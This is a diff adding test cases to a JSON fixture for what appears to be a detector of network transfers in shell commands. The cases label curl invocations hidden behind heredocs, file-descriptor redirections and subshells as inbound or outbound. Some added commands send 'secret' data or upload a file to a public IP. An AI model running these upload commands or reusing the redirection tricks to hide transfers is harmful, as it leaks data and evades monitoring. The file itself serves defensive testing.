@@ -8087,6 +8087,138 @@
   {
    "command": "bash -n <<< 'curl -T secret https://192.168.1.1/up'",
    "transfer": null
+  },
+  {
+   "command": "curl -K - 3<<'EOF' <&3\nurl = https://8.8.8.8/a\ndata = secret\nEOF",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl -K - 3<<'EOF' <&3\nurl = https://8.8.8.8/a\nEOF",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl -K - 3<<'EOF' 0<&3-\nurl = https://8.8.8.8/a\ndata = secret\nEOF",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "sh 3<<'EOF' <&3\ncurl -T f https://8.8.8.8/up\nEOF",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl -K - <&3",
+   "transfer": null
+  },
+  {
+   "command": "curl -K - <<< 'url = https://8.8.8.8/a' <&3",
+   "transfer": null
+  },
+  {
+   "command": "curl -K - 0<&3 3<<< 'url = https://8.8.8.8/a'",
+   "transfer": null
+  },
+  {
+   "command": "curl -K - 3<<< 'url = https://8.8.8.8/a' 3<<< 'url = https://8.8.4.4/b' <&3",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "8.8.4.4",
+      "resolved_host": "8.8.4.4",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "{ curl -K - <&3; } 3<<< 'url = https://8.8.8.8/a'",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl -K - 3<<< 'url = https://8.8.8.8/a' 4<&3- <&3",
+   "transfer": null
+  },
+  {
+   "command": "curl -K - 3<<< 'url = https://8.8.8.8/a' 4<&3- <&4",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "{ echo x | curl -K -; } <<< 'url = https://8.8.8.8/a'",
+   "transfer": null
+  },
+  {
+   "command": "{ curl -K -; } <<< 'url = https://8.8.8.8/a'",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
   }
  ]
 }
